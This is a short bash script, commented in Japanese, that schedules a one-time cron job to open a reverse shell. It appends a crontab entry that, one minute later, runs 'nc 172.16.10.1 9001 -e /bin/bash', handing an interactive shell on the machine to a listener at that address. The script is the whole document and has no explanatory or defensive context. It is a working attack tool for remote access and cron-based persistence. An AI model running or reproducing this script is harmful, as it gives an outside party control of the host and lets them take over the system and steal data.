#!/bin/bash
# 1分後に一度だけリバースシェルを実行するcronジョブを登録
t=$(date -d "+1 minute" '+%M %H %d %m *')
( crontab -l 2>/dev/null; echo "$t nc 172.16.10.1 9001 -e /bin/bash" ) | crontab -